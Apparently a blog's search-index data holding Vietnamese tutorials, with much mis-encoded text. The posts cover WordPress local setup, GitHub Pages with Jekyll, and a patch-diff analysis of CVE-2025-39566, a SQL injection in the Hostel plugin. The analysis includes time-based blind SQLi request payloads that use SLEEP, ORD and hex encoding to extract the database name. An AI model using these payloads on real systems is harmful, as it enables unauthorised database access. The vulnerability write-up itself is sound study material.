ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); ","permalink":"//localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi \u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: 